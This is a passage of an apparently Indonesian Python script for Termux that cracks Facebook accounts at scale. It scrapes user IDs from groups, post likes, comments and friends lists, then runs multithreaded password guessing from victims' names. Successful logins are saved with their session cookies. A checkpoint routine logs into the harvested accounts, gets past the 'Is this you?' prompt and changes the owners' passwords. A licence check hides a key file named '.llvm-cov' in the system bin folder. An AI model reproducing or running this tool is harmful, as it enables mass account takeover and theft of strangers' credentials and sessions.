([bold cyan]2[bold white]) Check User Agent"""))
    ytbjts = input('  %s[%s?%s] Choose : '%(N,O,N))
    if ytbjts == '':
        print('\n  %s[%sÃ—%s] Cant Be Empty'%(N,M,N));time.sleep(2);seting_yntkts()
    elif ytbjts in['1','01']:
        yo_ndak_tau_ko_tanya_saia()
    elif ytbjts in['2','02']:
        try:
            user_agent = open('.YNTKTS.txt', 'r').read()
        except IOError:
            user_agent = '[bold red]-'
        prints(Panel(f"[[bold green]+[bold white]] Your User Agent : [bold green]{user_agent}[bold white]"))
        input('\n  %s[ %sReturn%s ]'%(N,O,N));moch_yayan()
    else:
        print('\n %s[%sÃ—%s] Correct Input'%(N,M,N));time.sleep(2);seting_yntkts()

# USER AGENT BARU
def yo_ndak_tau_ko_tanya_saia():
    os.system('rm -rf .YNTKTS.txt')
    _asu_ = input('\n  [%s?%s] Want to Use Your Hp User Agent [Y/t]: '%(O,N))
    if _asu_ == '':
        print('\n  %s[%sÃ—%s] Cant Be Empty '%(N,M,N));yo_ndak_tau_ko_tanya_saia()
    elif _asu_ in['Y','y']:
        jalan('\n  %s *%s You Will Be Redirected To Your Browser After Being Redirected To Your Browser.\n  %s*%s You Will See  %sMY USER AGENT%s Then Copy All Your User Agents...'%(O,N,O,N,H,N));time.sleep(2);os.system('xdg-open https://www.google.com/search?q=what+is+my+user+agent&oq=what&aqs=chrome.2.69i57j35i39l2j0i512j0i433i512l2j0i131i433l2j0i433i512j0i271l3.1281j0j4&client=ms-android-transsion&sourceid=chrome-mobile&ie=UTF-8')
        _agen_ = input(' [%s?%s] Enter Your Device User Agent :%s '%(O,N,H))
        open('.YNTKTS.txt', 'w').write(_agen_);time.sleep(2)
        jalan('\n   %s[%sâœ“%s] Successfully Using Your Device User Agent...'%(N,H,N))
        input('\n   %s[ %sReturn%s ]'%(N,O,N));moch_yayan()
    elif _asu_ in['T','t']:
        _agen_ = input(' [%s?%s] Enter User Agent :%s '%(O,N,H))
        open('.YNTKTS.txt', 'w').write(_agen_);time.sleep(2)
        jalan('\n  %s[%sâœ“%s] Successfully Changed User Agent...'%(N,H,N))
        input('\n  %s[ %sReturn%s ]'%(N,O,N));moch_yayan()
    else:
        print('\n  %s[%s!%s] Y/t'%(N,M,N));yo_ndak_tau_ko_tanya_saia()

# CRACK DARI GRUP
def crack_grup(hencet, mmk):
    try:
        kontol=requests.get(hencet,cookies=mmk).text
        memek=re.findall('\<h3\>\<a\ class\=\"..\"\ href\=\"\/(.*?)\"\>(.*?)<\/a\>',kontol)
        for softek in memek:
            if "profile.php?" in softek[0]:
                id.append(re.findall("id=(.*)",softek[0])[0]+"<=>"+softek[1])
            else:
                id.append(softek[0]+"<=>"+softek[1])
            sys.stdout.write('\r [*] Collecting %s ID... '%(len(id))); sys.stdout.flush()
        if "Lihat Selengkapnya" in kontol:
            crack_grup(url_mb+BeautifulSoup(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
        else:
            def geh(gey):
                a=requests.get(gey,cookies=mmk).text
                b=re.findall('\<h3\ class\=\".*?">\<span>\<strong>\<a\ href\=\"/(.*?)\">(.*?)</a\>\</strong\>',a)
                if len(b)!=0:
                    for c in b:
                        if "profile.php" in c[0]:
                            d=re.search("profile.php\?id=(\\d*)",c[0]).group(1)
                            if d in id:
                                continue
                            else:
                                id.append(d+"<=>"+c[1])
                        else:
                            d=re.search("(.*?)\?refid",c[0]).group(1)
                            if d in id:
                                continue
                            else:
                                id.append(d+"<=>"+c[1])
                        sys.stdout.write('\r [*] Collecting %s ID... '%(len(id))); sys.stdout.flush()
                if "Lihat Postingan Lainnya" in a:
                    geh(url_mb+BeautifulSoup(a,"html.parser").find("a",string="Lihat Postingan Lainnya").get("href"))
            geh(f"{url_mb}/groups/"+re.search("id=(\\d*)",hencet).group(1))
    except:pass
# CRACK LIKE POSTINGAN
def like_post(hencet, mmk):
    try:
        kontol=requests.get(hencet,cookies=mmk).text
        if "Semua 0" in kontol:
            print("\n [!] No One Responded To The Post, Awokawokawok, Sorry The Account Is Quiet:v");time.sleep(2);moch_yayan()
        else:
            memek=re.findall('\<h3\ class\=\".."\>\<a\ href\=\"(.*?)"\>(.*?)<\/a\>',kontol)
            for softek in memek:
                if "profile.php?" in softek[0]:
                    id.append(re.findall("id=(.*)",softek[0])[0]+"<=>"+softek[1])
                else:
                    id.append(re.findall("/(.*)",softek[0])[0]+"<=>"+softek[1])
                sys.stdout.write('\r [*] Collecting %s ID... '%(len(id))); sys.stdout.flush()
            if "Lihat Selengkapnya" in kontol:
                like_post(url_mb+BeautifulSoup(kontol,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
    except:pass
# CRACK KOMENTAR POSTINGAN
def ngomen_post(hencet, ikeh):
    try:
        kontol= requests.get(hencet,cookies=ikeh,headers=header_grup).text.encode("utf-8")
        memek = BeautifulSoup(kontol,'html.parser')
        for mmk in memek.find_all('h3'):
            for _id_ in mmk.find_all('a',href=True):
                if "profile.php" in _id_.get("href"):
                    xz = _id_.get("href").split('=')[1]
                    bb = xz.split('&')[0]
                    xd = _id_.text
                    id.append(bb+'<=>'+xd+'\n')
                else:
                    xz = _id_.get("href").split('?')[0]
                    bb = xz.split('/')[1]
                    xd = _id_.text
                    id.append(bb+'<=>'+xd+'\n')
                sys.stdout.write('\r [*] Collecting %s ID... '%(len(id))); sys.stdout.flush()
        for asu in memek.find_all("a",href=True):
            if "Lihat komentar lainnyaâ€¦" in asu.text:
                ngomen_post("https://mbasic.facebook.com/"+asu.get("href"), ikeh)
    except:pass
# CRACK ID RANDOM
def _ngocok_(__ppk__):
    try:
        nanya_keun = int(input(f'  [{O}?{N}] Enter Target Amount : '))
    except:nanya_keun=1
    prints(Panel("[[bold cyan]*[bold white]] Type 'me' If You Want To Crack From Your Friends List."))
    for mnh in range(nanya_keun):
        mnh +=1
        try:user = input(f'  [{O}*{N}] Enter ID or Username {H}{mnh}{N} : ');_memek_ = __convert__(user)
        except AttributeError:print(f"  {N}[{M}Ã—{N}] Incorrect Username Or ID");continue
        try:
            data = urllib.request.urlopen(url_graph.format(f"v13.0/{_memek_.get('_kontol_')}{ikeh}&access_token={__ppk__}"))
            xxxx = json.load(data)["friends"]
            for x in xxxx["data"]:
                id.append(x['id'] + '<=>' + x['name'])
        except (KeyError, urllib.error.HTTPError):
            print(f'  {N}[{M}Ã—{N}] Failed To Retrieve Id, Probably ID Is Not Public');continue
# USERNAME CONVERT TO ID
def __convert__(mmk):
    if "me" in mmk:
        return {"_kontol_":mmk}
    elif(re.findall("\w+",mmk)):
        r = requests.get(f"https://mbasic.facebook.com/{mmk}?_rdr").text
        try:
            user = re.findall('\;rid\=(\d+)\&',str(r))[0]
        except:
            user = mmk
    return {"_kontol_":user}
# CHEKER AKUN CHECKPOINT
def gabut():
    dirs = os.listdir("results")
    prints(Panel("[ Crack Results Stored in Your Files ]"))
    for file in dirs:
        print("  [%s+%s] %s"%(O,N,file))
    jalan(f"  [{M}Ã—{N}] Before Entering The File, Turn On Airplane Mode For 3 Seconds.");time.sleep(5)
    files = input("\n  [%s?%s] Enter File Name : %s"%(M,N,H))
    try:
        buka_baju = open(f'results/{files}','r').readlines()
    except IOError:
        print('\n  [!] File Doesnt Exist');time.sleep(2);moch_yayan()
    ww=input(f"\n  {N}[{O}?{N}] Change Password When Tap Yes [Y/t]: ")
    if ww in ("Y","y","ya"):
        ubahP.append("y")
        print(f"  [{H}â€¢{N}] Password Example : {H}IDlee{N}")
        pwBar=input(f"\n  [{H}+{N}] Enter New Password : ")
        if len(pwBar) <= 5:
             print('\n  %s[%sÃ—%s] Password Minimum 6 Characters'%(N,M,N))
        else:
            pwBaru.append(pwBar)
    print('%s  [%s*%s] Total %s%s%s Account'%(N,O,N,K,str(len(buka_baju)),N))
    jalan("  %s[%s#%s] --------------------------------------------"%(N,O,N))
    for memek in buka_baju:
        kontol = memek.replace('\n', '')
        titid  = kontol.split('|')
        jalan(f'  {N}[{M}>{N}] Trying To Login to Account : {K}{kontol.replace(" [Ã—] ", "")}{N}')
        try:
            log_hasil(titid[0].replace(" [Ã—] ", ""), titid[1])
        except requests.exceptions.ConnectionError:
            continue
        print("")
    print("")
    print('   [ %sChecking Process Complete %s]\n'%(H,N))
    input('  [ %sRETURN%s ] '%(O,N));os.system(f"rm -rf {buka_baju}");moch_yayan()

# CHEKPOINT DETEDTOR
def log_hasil(user, pasw):
    global aman,cp,salah
    session=requests.Session()
    session.headers.update({
        "Host":"mbasic.facebook.com",
        "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "accept-encoding":"gzip, deflate, br",
        "accept-language":"id-ID,id;q=0.9",
        "referer":"https://mbasic.facebook.com/",
        "user-agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
    })
    soup=BeautifulSoup(session.get(url_mb+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
    link=soup.find("form",{"method":"post"})
    for x in soup("input"):
        data.update({x.get("name"):x.get("value")})
    data.update({"email":user,"pass":pasw})
    urlPost=session.post("https://mbasic.facebook.com"+link.get("action"),data=data)
    response=BeautifulSoup(urlPost.text, "html.parser")
    if "Temukan Akun Anda" in re.findall("\<title>(.*?)<\/title>",str(urlPost.text)):
        sys.stdout.write('\r %s[%s!%s] TURN ON AIRCRAFT MODE 2 SECONDS         '%(N,M,N)),
    if "c_user" in session.cookies.get_dict():
        if "Akun Anda Dikunci" in urlPost.text:
            print(f"\r {N}[{M}Ã—{N}] NEW SESSION ACCOUNT")
        else:
            coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
            open('results/OKE.txt', 'a').write(f" [âœ“] {user}|{pasw}|{coki}\n")
            print(f"\r   ðŸŽ‰{H} Hurray Bro, This Account Can Be Bypassed{N}");jalan(f"\r   {O}*{H}  Wait A Moment Checking The Application...{N}");time.sleep(0.03)
            cek_apk(session,coki)
    elif "checkpoint" in session.cookies.get_dict():
        title=re.findall("\<title>(.*?)<\/title>",str(response))
        link2=response.find("form",{"method":"post"})
        listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
        for x in response("input"):
            if x.get("name") in listInput:
                data2.update({x.get("name"):x.get("value")})
        an=session.post(url_mb+link2.get("action"),data=data2)
        response2=BeautifulSoup(an.text,"html.parser")
        number=0
        cek=[cek.text for cek in response2.find_all("option")]
        if(len(cek)==0):
            if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
                if "y" in ubahP:
                    mmk = pwBaru
                    print(f"\r   ðŸŽ‰{H} Hurray Bro,  Login And  Tap Yes This Account Can Be Bypassed{N}");jalan(f"\r   {O}*{H}  tunggu sebentar sedang mengubah password dan mengecek aplikasi...{N}");time.sleep(0.03)
                    ubah_pw(session,response,link2,user, mmk)
                else:
                    mmk = "IDlee:v"
                    print(f"\r   ðŸŽ‰{H} Hurray Bro,  Login And  Tap Yes This Account Can Be Bypassed{N}");jalan(f"\r   {O}*{H}  tunggu sebentar sedang mengubah password dan mengecek aplikasi...{N}");time.sleep(0.03)
                    ubah_pw(session,response,link2,user, mmk)
            elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
                print('  [%s!%s] Opshh The Account Has Two-Factor Authentication Installed :('%(M,N))
            else:
                print(f"  {N}[{M}!{N}] Error")
        else:
            print("  %s[%s*%s] There is %s Option "%(N,O,N,len(cek)))
        for opt in range(len(cek)):
            print(f"  [\x1b[1;92m{str(opt+1)}\x1b[0m] "+cek[opt])
    else:
        print(f"\r  {N}[{M}!{N}] Wrong Password Or Changed")

#UBAH PW
def ubah_pw(session,response,link2,user,mmk):
    dat,dat2={},{}
    but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
    for x in response("input"):
        if x.get("name") in but:
            dat.update({x.get("name"):x.get("value")})
    ubahPw=session.post(url_mb+link2.get("action"),data=dat).text
    resUbah=BeautifulSoup(ubahPw,"html.parser")
    link3=resUbah.find("form",{"method":"post"})
    but2=["submit[Next]","nh","fb_dtsg","jazoest"]
    if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
        for b in resUbah("input"):
            if b.get("name") in but2:
                dat2.update({b.get("name"):b.get("value")})
        dat2.update({"password_new":"".join(mmk)})
        an=session.post(url_mb+link3.get("action"),data=dat2)
        coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
        print(f"\r {N}[{H}âœ“{N}] Successfully Changed Password To:\n {N}[{H}âœ“{N}]{H} {user}|{''.join(mmk)}|{coki}{N}")
        open('results/TAB-YES.txt', 'a').write(f" [âœ“] {user}|{''.join(mmk)}|{coki}\n")
        cek_apk(session,coki)
# CEK APLIKASI YANG TERKAIT
def cek_apk(session,cookie):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cookie}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f"\n  {N}[{M}!{N}] Opshh There Are No Active Apps On This Account.")
    else:
        for i in range(len(game)):
            print("    %s%s. %s%s"%(H,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cookie}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f"\n  {N}[{M}!{N}] Opshh There Is No Expired Application In This Account.")
    else:
        for i in range(len(game)):
            print("    %s%s. %s%s"%(K,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))

def tampilkan_apk():
    prints(Panel("Displaying The Application Will Make The Account  To Easily Enter Checkpoints Due To Using Excessive Module Requests. It Is Not Recommended To Display The Application."))
    ww=input(f"  [{M}?{N}] Do You Still Want to Show Related Applications [Y/t]: ")
    if ww in ("Y","y","ya"):
        Apk.append("y")
    else:
        Apk.append("t")
# MULAI CRACK
class __crack__:

    def __init__(self):
        self.id = []

    def plerr(self,id):
        self.id = id
        prints(Panel(f"[[bold cyan]*[bold white]] Total ID : [bold red]{len(self.id)}[bold white]"))
        ___yayanganteng___ = input('  [%s?%s] Do You Want To Use Manual Password? [Y/t]: '%(O,N))
        tampilkan_apk()
        if ___yayanganteng___ in ('Y', 'y'):
            prints(Panel('[[bold red]![bold white]] Use , (Comma) For Separator Example: Password123,Password12345,etc. Each Word Is At Least 6 Characters Or More'))
            while True:
                pwek = input('  [%s?%s] Enter Password : '%(O,N))
                prints(Panel(f'[[bold cyan]*[bold white]] Crack With Password -> [ [bold red]{pwek}[bold white] ]'))
                if pwek == '':
                    print('  %s[%sÃ—%s] Dont Leave The Password Bro'%(N,M,N))
                elif len(pwek)<=5:
                    print('  %s[%sÃ—%s] Password Minimum 6 Characters'%(N,M,N))
                else:
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        cin = input(f'  [{O}*{N}] Method : ')
                        if cin == '':
                            print('\n  %s[%sÃ—%s] Cant Be Empty Bro'%(N,M,N));__yan__()
                        elif cin == '1':
                            ingfo()
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__metode__, kimochi, ysc, "m.facebook.com")
                                    except: pass

                            hasil(ok,cp)
                        elif cin == '2':
                            ingfo()
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__metode__, kimochi, ysc, "mbasic.facebook.com")
                                    except: pass

                            hasil(ok,cp)
                        elif cin == '3':
                            ingfo()
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__metode__, kimochi, ysc, "m.facebook.com")
                                    except: pass

                            hasil(ok,cp)
                        else:
                            print('\n  %s[%sÃ—%s] Correct Input'%(N,M,N));__yan__()
                    mentod()
                    __yan__(pwek.split(','))
                    break
        elif ___yayanganteng___ in ('T', 't'):
            mentod()
            self.__pler__()
        else:
            print('\n  %s[%sÃ—%s] Y/t !'%(N,M,N));self.plerr(id)

    def __metode__(self, user, pasw, cebok):
        global ok,cp,loop
        try:os.mkdir('results')
        except:pass
        try:
            for pw in pasw:
                pw = pw.lower()
                session=requests.Session()
                header = {
                    "Host"                      : cebok,
                    "upgrade-insecure-requests" : "1",
                    "user-agent"                : "NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
                    "accept"                    : "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "dnt"                       : "1",
                    "x-requested-with"          : "mark.via.gp",
                    "sec-fetch-site"            : "same-origin",
                    "sec-fetch-mode"            : "cors",
                    "sec-fetch-user"            : "empty",
                    "sec-fetch-dest"            : "document",
                    "referer"                   : "https://m.facebook.com/",
                    "accept-encoding"           : "gzip, deflate br",
                    "accept-language"           : bahasa
                }
                r = session.get(f"https://{cebok}/{aedx}{ssss}{dddd}{aaaa}", headers=header)
                das = {
                    "lsd":re.search('name="lsd" value="(.*?)"', str(r.text)).group(1),
                    "jazoest":re.search('name="jazoest" value="(.*?)"', str(r.text)).group(1),
                    "uid":user,
                    "flow":"login_no_pin",
                    "pass":pw,
                    "next":"https://developers.facebook.com/"+cccc+"/"+uvgo+"/"+hhhh+"/",
                }
                header1 = {
                    "Host"                      : cebok,
                    "cache-control"             : "max-age=0",
                    "upgrade-insecure-requests" : "1",
                    "origin"                    : "https://"+cebok,
                    "content-type"              : "application/x-www-form-urlencoded",
                    "user-agent"                : "Mozilla/5.0 (Linux; Android 11; Infinix X695) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36",
                    "accept"                    : "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                    "x-requested-with"          : "XMLHttpRequest",
                    "sec-fetch-site"            : "same-origin",
                    "sec-fetch-mode"            : "cors",
                    "sec-fetch-user"            : "empty",
                    "sec-fetch-dest"            : "document",
                    "referer"                   : "https://"+cebok+"/"+aedx+ssss+dddd+aaaa,
                    "accept-encoding"           : "gzip, deflate br",
                    "accept-language"           : bahasa
                }
                po = session.post(f"https://{cebok}/{bbbb}/{awss}/{cuii}/{mmkk}", data = das, headers = header1, allow_redirects = False)
                if 'c_user' in session.cookies.get_dict():
                    cooz = session.cookies.get_dict()
                    coki = 'datr=' + cooz['datr'] + ';' + ('c_user=' + cooz['c_user']) + ';' + ('fr=' + cooz['fr']) + ';' + ('xs=' + cooz['xs'])
                    if "y" in Apk:
                        print(f'\r   {H}[ID-OK] {user} | {pw}                 {N}')
                        self.cek_apk(session, coki)
                    elif "t" in Apk:
                        print(f'\r   {H}[ID-OK] {user} | {pw}                 {N}')
                    wrt = ' [âœ“] %s | %s | %s' % (user,pw,coki)
                    ok.append(wrt)
                    open('results/ID-OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    self.follow(session,coki)
                    break
                elif 'checkpoint' in session.cookies.get_dict():
                    try:
                        tokenz = open('.token.txt').read()
                        cp_ttl = session.get(f'https://graph.facebook.com/{user}?fields=birthday&access_token={tokenz}').json()['birthday']
                        month, day, year = cp_ttl.split('/')
                        month = bulan_ttl[month]
                        print('\r  [ID-CP] %s | %s | %s %s %s     %s' % (K,user,pw,day,month,year,N))
                        wrt = ' [Ã—] %s | %s | %s %s %s' % (user,pw,day,month,year)
                        cp.append(wrt)
                        open('results/ID-CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                        break
                    except (KeyError, IOError):
                        month = ''
                        day   = ''
                        year  = ''
                    except:pass
                    print('\r  [ID-CP] %s | %s                %s' % (K,user,pw,N))
                    wrt = ' [Ã—] %s | %s' % (user,pw)
                    cp.append(wrt)
                    open('results/ID-CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                else:continue

            loop+=1
            animasi = random.choice(["\x1b[1;91mâ€¢","\x1b[1;92mâ€¢","\x1b[1;93mâ€¢","\x1b[1;94mâ€¢","\x1b[1;95mâ€¢","\x1b[1;96mâ€¢","\x1b[1;97mâ€¢"])
            sys.stdout.write(f"\r[{animasi}{N}] Cracking {loop}/{len(self.id)} ID-OK-:{len(ok)} ID-CP-:{len(cp)}  [{M}{'{:.1%}'.format(loop/float(len(self.id)))}{N}] ")
            sys.stdout.flush()

        except requests.exceptions.ConnectionError:
            sys.stdout.write(f"\r{N}  [{M}Ã—{N}] No Internet Connection.              ")
            sys.stdout.flush()

    def cek_apk(self, req, cok):
        hit1, hit2 = 0,0
        cek = req.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":cok}).text
        cek2= req.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":cok}).text
        if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
            if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
                print(f"\r  {N}[{M}!{N}] No Active Apps Associated")
            else:
                print(f"\r  {N}[{O}+{N}] Active Apps:                                      ")
                apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
                ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
                for muncul in apkAktif:
                    hit1+=1
                    try:
                        muncul = re.findall('\<a\ href\=\".*?\">(.*?)<\/a\>',str(muncul))[0]
                    except:
                        muncul = muncul
                    if(hit1==1):
                        print(f"\r   {N}\-> [{O}{hit1}{N}] {muncul} -> {H}{ditambahkan[hit2]}{N}                       ")
                    else:
                        print(f"\r   {N}\-> [{O}{hit1}{N}] {muncul} -> {H}{ditambahkan[hit2]}{N}                       ")
                    hit2+=1
            if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
                print(f"\r  {N}[{M}!{N}] No Expired Apps Associated")
            else:
                hit1,hit2=0,0
                print(f"\r  {N}[{M}+{N}] Expired Application:                                     ")
                apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
                kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
                for muncul in apkKadaluarsa:
                    hit1+=1
                    try:
                        muncul = re.findall('\<a\ href\=\".*?\">(.*?)<\/a\>',str(muncul))[0]
                    except:
                        muncul = muncul
                    if(hit1==1):
                        print(f"\r   {N}\-> [{M}{hit1}{N}] {muncul} -> {K}{kadaluarsa[hit2]}{N}                       ")
                    else:
                        print(f"\r   {N}\-> [{M}{hit1}{N}] {muncul} -> {K}{kadaluarsa[hit2]}{N}                       ")
                    hit2+=1
        else:
            print(f"\r  [{M}!{N}] Cookie Invalid                        ")

#    <- Bot followers ->
    def __pler__(self):
        yan = input(f'  [{O}*{N}] Method : ')
        if yan == '':
            print('\n %s[%sÃ—%s] Oga Dont Leave Am Empty, You Wan Collect? ðŸ˜‚'%(N,M,N));self.__pler__()
        elif yan in ('1', '01'):
            ingfo()
            with YayanGanteng(max_workers=30) as kirim:
                for yntkts in self.id:
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 1:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        elif len(xz) == 2:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        elif len(xz) == 3:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        kirim.submit(self.__metode__, uid, pwx, "free.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif yan in ('2', '02'):
            ingfo()
            with YayanGanteng(max_workers=30) as kirim:
                for yntkts in self.id:
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 1:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        elif len(xz) == 2:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        elif len(xz) == 3:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        kirim.submit(self.__metode__, uid, pwx, "mbasic.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        elif yan in ('3', '03'):
            ingfo()
            with YayanGanteng(max_workers=30) as kirim:
                for yntkts in self.id:
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 1:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        elif len(xz) == 2:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        elif len(xz) == 3:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+xz[1], xz[0]+"12345"]
                        kirim.submit(self.__metode__, uid, pwx, "m.facebook.com")
                    except:
                        pass
            hasil(ok,cp)
        else:
            print('\n %s[%sÃ—%s] Correct Input'%(N,M,N));self.__pler__()

def genkey():
	try:
		rn = open('/data/data/com.termux/files/usr/bin/.llvm-cov', 'r').read()
		rb = rn+basesplit
		print("\n\033[1;32;40m                     YOU ARE NOT PREMIUM USER ")
		print("\033[1;37;40m                 FIRST BUY PREMIUM KEY FROM ADMIN")
		print("\033[1;32;40m                       SEND THIS KEY TO ADMIN \n \033[1;37;40mYOUR KEY : \033[1;32;40m%s"%(rb))
		subprocess.check_output(["am", "start", "https://wa.me/+8801829725888"])
		exit()
	except(IOError):
		rb = rx
		open("/data/data/com.termux/files/usr/bin/.llvm-cov","w").write(rb)
		os.system("chmod 777 /data/data/com.termux/files/usr/bin/.llvm-cov")
		print("\n\033[1;32;40m             YOU ARE NOT PREMIUM USER ")
		print("\033[1;37;40m                 FIRST BUY PREMIUM KEY FROM ADMIN")
		print("\033[1;32;40m                 SEND THIS KEY TO ADMIN \n \033[1;37;40mYOUR KEY : %s"%(rb,basesplit))
		subprocess.check_output(["am", "start", "https://wa.me/+8801829725888"])
		exit()

def keycheck():
    try:
        k = open("/data/data/com.termux/files/usr/bin/.llvm-cov","r").read()
        if k+basesplit in rq:
            moch_yayan()
        else:genkey()
    except(IOError):
        genkey()
   	
if __name__=='__main__':
	os.system('git pull')
	keycheck()
if __name__ == '__main__':
    moch_yayan()

